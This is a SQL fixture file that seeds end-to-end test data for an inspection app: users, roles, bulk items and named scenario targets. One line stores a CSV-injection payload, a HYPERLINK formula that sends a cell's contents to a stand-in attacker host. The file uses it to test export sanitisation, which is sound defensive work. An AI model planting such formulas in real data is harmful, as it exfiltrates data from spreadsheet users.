-- E2E fixtures: a few IFS objects, 4 users in SS-75, >1000 items (to prove
-- the client pages past PostgREST's 1000-row cap) and a handful of named
-- targets the scenarios use.
INSERT INTO public.ifs_objects (id, description, sece) VALUES
  ('OBJ-PUMP-101', 'Fire pump P-101', true),
  ('OBJ-CRANE-7',  'Deck crane 7 slew ring', true),
  ('OBJ-LINE-22',  'Ballast line 22', false),
  ('OBJ-HULL-3',   'Hull plate column 3', false)
ON CONFLICT DO NOTHING;

-- handle_new_user creates inactive viewer profiles; promote them.
INSERT INTO auth.users (id, email) VALUES
  ('00000000-0000-0000-0000-00000000a001', 'admin1@test.local'),
  ('00000000-0000-0000-0000-00000000c001', 'insp1@test.local'),
  ('00000000-0000-0000-0000-00000000c002', 'insp2@test.local'),
  ('00000000-0000-0000-0000-00000000e001', 'viewer1@test.local')
ON CONFLICT DO NOTHING;
UPDATE public.profiles SET active = true, role = 'admin',
       unit_id = (SELECT id FROM public.units WHERE code = 'SS-75')
 WHERE email = 'admin1@test.local';
UPDATE public.profiles SET active = true, role = 'inspector',
       unit_id = (SELECT id FROM public.units WHERE code = 'SS-75')
 WHERE email IN ('insp1@test.local', 'insp2@test.local');
UPDATE public.profiles SET active = true, role = 'viewer',
       unit_id = (SELECT id FROM public.units WHERE code = 'SS-75')
 WHERE email = 'viewer1@test.local';

-- 1200 bulk items spread over the 14 zones (created "by" insp2, days ago).
INSERT INTO public.items (unit_id, zone_id, name, status, prob, cons, priority,
                          freq_insp, last_insp, next_insp, created_by, created_at, notes)
SELECT u.id,
       'Z' || lpad(((g % 14) + 1)::text, 2, '0'),
       'Bulk item ' || lpad(g::text, 4, '0'),
       (ARRAY['OK','Attention','Critical','Pending']::item_status[])[(g % 4) + 1],
       (g % 5) + 1, ((g + 2) % 5) + 1,
       (ARRAY['Low','Medium','High','Critical']::item_priority[])[(g % 4) + 1],
       'Monthly', current_date - 20, current_date + 10,
       '00000000-0000-0000-0000-00000000c002',
       now() - interval '10 days' + g * interval '1 second',
       NULL
  FROM generate_series(1, 1200) g, public.units u WHERE u.code = 'SS-75';

-- Named targets (fixed ids) used by individual scenarios.
INSERT INTO public.items (id, unit_id, zone_id, name, status, prob, cons, notes, created_by, created_at)
SELECT v.id::uuid, u.id, v.zone, v.name, 'Attention', 3, 3, v.notes,
       '00000000-0000-0000-0000-00000000c002', now() - interval '5 days'
  FROM public.units u,
       (VALUES
         ('00000000-0000-0000-0000-0000000e2e01', 'Z13', 'E2E Fail Target',     'base note'),
         ('00000000-0000-0000-0000-0000000e2e02', 'Z13', 'E2E Conflict Target', 'base note'),
         ('00000000-0000-0000-0000-0000000e2e03', 'Z13', 'E2E Reload Target',   'base note'),
         ('00000000-0000-0000-0000-0000000e2e04', 'Z13', 'E2E Draft Target',    'base note'),
         ('00000000-0000-0000-0000-0000000e2e05', 'Z13', 'E2E Cancel Target',   'base note'),
         ('00000000-0000-0000-0000-0000000e2e06', 'Z13', 'E2E Reading Target',  'base note'),
         ('00000000-0000-0000-0000-0000000e2e07', 'Z13', 'E2E Evidence Target', 'base note'),
         ('00000000-0000-0000-0000-0000000e2e08', 'Z13', 'E2E Delete Target',   '=1+1'),
         ('00000000-0000-0000-0000-0000000e2e09', 'Z13', 'E2E Lost Response Target', 'base note'),
         ('00000000-0000-0000-0000-0000000e2e0a', 'Z13', 'E2E Deleted Elsewhere Target', 'base note'),
         ('00000000-0000-0000-0000-0000000e2e0b', 'Z13', 'E2E Draft Conflict Target', 'base note'),
         ('00000000-0000-0000-0000-0000000e2e0c', 'Z13', 'E2E Evidence Fail Target', 'base note'),
         ('00000000-0000-0000-0000-0000000e2e0d', 'Z13', 'E2E Rate Target', 'base note'),
         ('00000000-0000-0000-0000-0000000e2e0e', 'Z13', 'E2E Nav Target', 'base note'),
         ('00000000-0000-0000-0000-0000000e2e0f', 'Z13', 'E2E A11y Target', 'base note')
       ) AS v(id, zone, name, notes)
 WHERE u.code = 'SS-75';
-- Two readings a year apart -> corrosion rate 0.125 mm/yr (decimal in CSV).
INSERT INTO public.readings (item_id, reading_date, depth_mm, location)
VALUES ('00000000-0000-0000-0000-0000000e2e0d', current_date - 365, 1.000, 'FR-1'),
       ('00000000-0000-0000-0000-0000000e2e0d', current_date, 1.125, 'FR-1');

-- A formula-looking note on an audited change, for the CSV injection check.
UPDATE public.items SET notes = '=HYPERLINK("http://evil.example/?x="&A1,"x")'
 WHERE id = '00000000-0000-0000-0000-0000000e2e08';

SELECT 'items' AS t, count(*) FROM public.items
UNION ALL SELECT 'profiles', count(*) FROM public.profiles WHERE active
UNION ALL SELECT 'history', count(*) FROM public.history;

-- Back-date the bulk items' 'created' events to their (back-dated) creation
-- time so the audit-log date filter has more than one day to work with.
UPDATE public.history h SET event_date = i.created_at
  FROM public.items i
 WHERE h.item_id = i.id AND h.action = 'created' AND i.name LIKE 'Bulk item %';
